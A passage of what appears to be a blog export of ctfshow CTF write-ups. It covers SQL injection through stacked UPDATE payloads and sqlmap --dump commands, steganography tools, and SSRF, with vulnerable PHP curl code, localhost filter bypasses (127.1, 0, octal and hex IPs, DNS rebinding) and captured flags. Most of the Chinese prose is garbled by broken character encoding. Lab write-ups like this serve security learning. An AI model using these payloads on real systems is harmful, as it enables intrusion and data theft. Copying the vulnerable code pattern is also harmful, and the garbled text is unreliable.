result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;update(ctfshow_user)set`username`=1;</span><br><span class="line">1;update(ctfshow_user)set`pass`=1;</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥åˆ°ç”¨æˆ·åä¸­</p>
<p>ï¼Œå¯†ç ä¸º1ï¼Œè´¦å·ä¸º1</p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/api/index.php?id= --referer=&quot;http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/sqlmap.php&quot; --dump</span><br></pre></td></tr></table></figure>

<p>â€“dumpæ˜¾ç¤ºæ‰€æœ‰å­—æ®µ</p>
<p>ä¸ºå•¥æ˜¯api æˆ‘ä¹Ÿä¸æ‡‚d</p>
<p>æ³¨æ„æ²¡æœ‰refererå¦åˆ™çˆ†ä¸å‡ºæ¥</p>
<p>ctfshow{b651c961-4e84-4d79-a08c-42114b092c45}</p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/api/ --data=&quot;id=1&quot; --referer=&quot;http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/sqlmap&quot; --dump</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ˜¯dataåˆ«æ‹¼é”™äº†</p>
<p>ctfshow{165ee80d-8978-4e45-beb4-5e907b5fa988}</p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>â€“method&#x3D; ä¿®æ”¹sqlmapçš„æäº¤æ–¹å¼ï¼Œä»¥ä»€ä¹ˆæ–¹å¼æäº¤ </p>
<p>Content-Typeï¼šç”¨äºå®šä¹‰ç”¨æˆ·çš„æµè§ˆå™¨æˆ–ç›¸å…³è®¾å¤‡å¦‚ä½•æ˜¾ç¤ºå°†è¦åŠ è½½çš„æ•°æ®ï¼Œæˆ–è€…å¦‚ä½•å¤„ç†å°†è¦åŠ è½½çš„æ•°æ®</p>
<p>ã€€ã€€MIMEï¼šMIMEç±»å‹å°±æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚</p>
<p>text&#x2F;htmlçš„æ„æ€æ˜¯å°†æ–‡ä»¶çš„content-typeè®¾ç½®ä¸ºtext&#x2F;htmlçš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨htmlçš„è§£æå™¨å¯¹æ–‡ä»¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</p>
<p>text&#x2F;plainçš„æ„æ€æ˜¯å°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶å¹¶ä¸ä¼šå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p>
<p>PUTæäº¤æ–¹å¼è¦æ³¨æ„ï¼Œä¿®æ”¹headersä¸ºContent-Type: text&#x2F;plainï¼Œå¦åˆ™é»˜è®¤ä¸ºè¡¨å•å‘é€ï¼ŒPUTè¯·æ±‚æ¥å—ä¸åˆ°.</p>
<p><a href="https://www.cnblogs.com/mmzuo-798/p/11634055.html">https://www.cnblogs.com/mmzuo-798/p/11634055.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --header=&quot;Content-Type:text/plain&quot; --referer=&quot;http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/sqlmap.php&quot; --dump --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p>ctfshow{af320e41-a9df-44e1-b286-3e61d4e4b33b}</p>
<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2>]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-miscå…¥é—¨</title>
    <url>/2023/01/20/ctfshow%E5%90%88%E9%9B%86-ctfshow-misc%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>zstegå®‰è£…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gem install zsteg</span><br></pre></td></tr></table></figure>



<span id="more"></span>

<h1 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h1><p>binwalk-e æ— æ³•åˆ†ç¦»</p>
<p>foremost åˆ†ç¦»æ‰“å¼€output</p>
<p>å‘ç°å›¾ç‰‡</p>
<p>ctfshow{1df0a9a3f709a2605803664b55783687}</p>
<h1 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h1><p>binwalk æŸ¥çœ‹å‘ç°ä¸¤ä¸ªIDATæ•°æ®å—</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>æ˜¯PNG IDATçš„å¯é€‰å‹ç¼©æ ¼å¼</p>
<p>ç”¨tweakpng</p>
<p>æ‰“å¼€åˆ é™¤çš„ä¸€ä¸ªIDAT</p>
<p>ä¿å­˜ï¼Œæˆ–è€…æŒ‰f7å›¾ç‰‡é¢„è§ˆå‘ç°flag</p>
<p><code>ctfshow&#123;44620176948fa759d3eeafeac99f1ce9&#125;</code></p>
<h1 id="misc-18"><a href="#misc-18" class="headerlink" title="misc 18"></a>misc 18</h1><p>ä¸‹è½½é¢˜ç›®ä¸º.tif æ–‡ä»¶</p>
<p>ç”¨ <code>exiftool</code> æŸ¥çœ‹å›¾ç‰‡.</p>
<p>å‚è€ƒæ–‡çŒ®ã€‚</p>
<p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793"> ctfshow-Miscå…¥é—¨_H3rmesk1tçš„åšå®¢-CSDNåšå®¢_ctfshowmiscå…¥é—¨</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_ssrf</title>
    <url>/2023/02/02/ctfshow%E5%90%88%E9%9B%86-ctfshow-ssrf/</url>
    <content><![CDATA[<p>ssrfä»‹ç»ä»¥åŠctfshow_ssrfé¢˜</p>
 <span id="more"></span>

<h2 id="1ã€SSRFæ¼æ´ç®€ä»‹ï¼š"><a href="#1ã€SSRFæ¼æ´ç®€ä»‹ï¼š" class="headerlink" title="1ã€SSRFæ¼æ´ç®€ä»‹ï¼š"></a>1ã€SSRF<a href="https://javaforall.cn/tag/%E6%BC%8F%E6%B4%9E">æ¼æ´</a>ç®€ä»‹ï¼š</h2><p>SSRFå…¨ç§°ï¼šServer-Side Request Forgeryï¼Œå³ï¼Œ<a href="https://cloud.tencent.com/product/cvm?from=10680">æœåŠ¡å™¨</a>ç«¯è¯·æ±‚ä¼ªé€ ã€‚æ˜¯ä¸€ä¸ªç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåœ¨ç›®æ ‡æœåŠ¡ç«¯æ‰§è¡Œçš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä½¿æœåŠ¡å™¨ç«¯å‘æ”»å‡»è€…æ„é€ çš„ä»»æ„åŸŸå‘å‡ºè¯·æ±‚ï¼Œç›®æ ‡é€šå¸¸æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨æœåŠ¡å™¨æ¼æ´ä»¥æœåŠ¡å™¨çš„èº«ä»½å‘é€ä¸€æ¡æ„é€ å¥½çš„è¯·æ±‚ç»™æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚</p>
<h2 id="2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š"><a href="#2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š" class="headerlink" title="2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š"></a>2ã€ä¸»è¦æ”»å‡»æ–¹å¼ï¼š</h2><p>å½“æ”»å‡»è€…æƒ³è¦è®¿é—®æœåŠ¡å™¨Bä¸Šçš„æœåŠ¡ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨é˜²ç«å¢™æˆ–è€…æœåŠ¡å™¨Bæ˜¯å±äºå†…ç½‘ä¸»æœºç­‰åŸå› å¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ã€‚å¦‚æœæœåŠ¡å™¨Aå­˜åœ¨SSRFæ¼æ´ï¼Œè¿™æ—¶æ”»å‡»è€…å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨Aæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡æœåŠ¡å™¨Aå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»å†…ç½‘çš„ç›®çš„ã€‚</p>
<p>DNSåè®®æ˜¯ç”¨æ¥å°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€ï¼ˆä¹Ÿå¯ä»¥å°†IPåœ°å€è½¬æ¢ä¸ºç›¸åº”çš„åŸŸååœ°å€ï¼‰</p>
 <!--more-->

<h5 id="urlæ ¼å¼"><a href="#urlæ ¼å¼" class="headerlink" title="urlæ ¼å¼"></a>urlæ ¼å¼</h5><p><a href="https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=aladdin">URLæ ¼å¼_ç™¾åº¦ç™¾ç§‘ (baidu.com)</a></p>
<p>åè®®ç±»å‹:&#x2F;&#x2F;æœåŠ¡å™¨åœ°å€[:ç«¯å£å·]&#x2F;è·¯å¾„&#x2F;æ–‡ä»¶å[å‚æ•°&#x3D;å€¼]ã€‚</p>
<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">//è¿™ä¸‰ä¸ªå‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆssrflæ¼æ´</span></span><br></pre></td></tr></table></figure>

<h5 id="curlåº“"><a href="#curlåº“" class="headerlink" title="curlåº“"></a>curlåº“</h5><p>curlæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œåˆ©ç”¨è¯¥æ‰©å±•å¯ä»¥å®ç°æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®æˆ–æ–‡ä»¶ä¼ è¾“</p>
<p><a href="https://www.php.net/manual/zh/book.curl.php">https://www.php.net/manual/zh/book.curl.php</a></p>
<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>ç”¨ cURL å‡½æ•°çš„åŸºæœ¬æ€æƒ³æ˜¯å…ˆä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-init.php">curl_init()</a> åˆå§‹åŒ– cURLä¼šè¯ï¼Œæ¥ç€å¯ä»¥é€šè¿‡ <a href="https://www.php.net/manual/zh/function.curl-setopt.php">curl_setopt()</a> è®¾ç½®éœ€è¦çš„å…¨éƒ¨é€‰é¡¹ï¼Œç„¶åä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-exec.php">curl_exec()</a> æ¥æ‰§è¡Œä¼šè¯ï¼Œå½“æ‰§è¡Œå®Œä¼šè¯åä½¿ç”¨ <a href="https://www.php.net/manual/zh/function.curl-close.php">curl_close()</a> å…³é—­ä¼šè¯ã€‚</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{fa1bbf25-b061-4ed6-bbde-a1c388eb367e}</p>
<h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">/*æœ¬å‡½æ•°ä¸æ˜¯ç”¨æ¥éªŒè¯ç»™å®š URL çš„æœ‰æ•ˆæ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¹Ÿä¼šæ¥å—ä¸å®Œæ•´æˆ–æ— æ•ˆçš„ URLï¼Œparse_url() ä¼šå°è¯•å°½é‡æ­£ç¡®è§£æ*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>

<p>parse_url()å‡½æ•°</p>
<p> schemeâ€”â€”å¦‚ http  ,         host  ,        port  ,         user       ,      pass       ,    path         ,</p>
<p>  queryâ€”â€”åœ¨é—®å· <code>?</code> ä¹‹å         .</p>
<p>  fragmentâ€”â€”åœ¨æ³¨é‡Šç¬¦å· <code>#</code> ä¹‹å         </p>
<p><a href="https://www.php.net/manual/zh/function.parse-url">https://www.php.net/manual/zh/function.parse-url</a></p>
<p>ä¸Šé¢˜payloadä¾æ—§å¯ç”¨</p>
<p><code> </code>ctfshow{2152a6a2-ee73-4272-9d80-7a7bf43591c2}</p>
<h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†local  127.0.   ã€‚</p>
<p><code>url=http://0/flag.php</code></p>
<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(!preg_match(&#x27;/localhost|1|0|ã€‚/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸€ï¼špayload:</p>
<p><code>url=http://r.3hpgmf.ceye.io/flag.php</code></p>
<p>è§£æ³•äºŒpayload:</p>
<p><code>url=http://sudo.cc/flag.phpd</code></p>
<p>è§£æ³•ä¸€å’ŒäºŒéƒ½æ˜¯ <strong>DNS Rebinding DNSé‡ç»‘å®š</strong>ä½†æˆ‘ä¸å¤ªæ‡‚</p>
<p>ä¸€ä¸ªå¸¸ç”¨çš„é˜²æŠ¤æ€è·¯æ˜¯ï¼šå¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ¬¡è¯·æ±‚ã€‚</p>
<p>ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šæ”»å‡»ã€‚</p>
<p>è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š</p>
<ul>
<li>æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP</li>
<li>å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯</li>
<li>æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚</li>
<li>ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚</li>
</ul>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">(9æ¡æ¶ˆæ¯) ctfshow ssrf_InvMacKingçš„åšå®¢-CSDNåšå®¢</a></p>
<p><strong>dnsè§£æåéƒ½æ˜¯127.0.0.1</strong>  </p>
<p><a href="http://www.ip33.com/dns.html">dnsè§£æç½‘ç«™</a></p>
<p>ctfshow{36fde1d8-aa94-4340-8dd5-297d32bb75c8}</p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=5))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<p>hosté•¿åº¦å°äºäº”</p>
<p>payload:<code>url=http://127.1/flag.php</code></p>
<p><code>url=http://0/flag.php</code></p>
<p><code> </code>ctfshow{cccbab1c-c78b-486c-b4da-da079ec826ad}</p>
<h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=3))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>url=http://0/flag.php</code></p>
<p>SSRFå¸¸è§çš„ç»•è¿‡æ–¹å¼</p>
<p>ï¼ˆä¸€ï¼‰æ›´æ”¹ipåœ°å€å†™æ³•ç»•è¿‡</p>
<p>ä¸€äº›å¼€å‘è€…ä¼šé€šè¿‡å¯¹ä¼ é€’çš„URLå‚æ•°è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
</code></pre>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿›åˆ¶çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚192.168.0.1è¿™ä¸ªipåœ°å€ï¼Œå°±å¯ä»¥æ”¹å†™æˆ</p>
<p>å…«è¿›åˆ¶ï¼š0300.0250.0.1</p>
<p>åè¿›åˆ¶æ•´æ•°ï¼š3232235521</p>
<p>åå…­è¿›åˆ¶&#x2F;æ•´æ•°ï¼š0xC0.0xA8.0.1&#x2F;0xC0A80001</p>
<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]); <span class="comment">//è¿”å› IPv4 åœ°å€æ•°ç»„ï¼Œå¦‚æœæ— æ³•è§£æï¼Œåˆ™è¿”å› falseã€‚hostname</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span 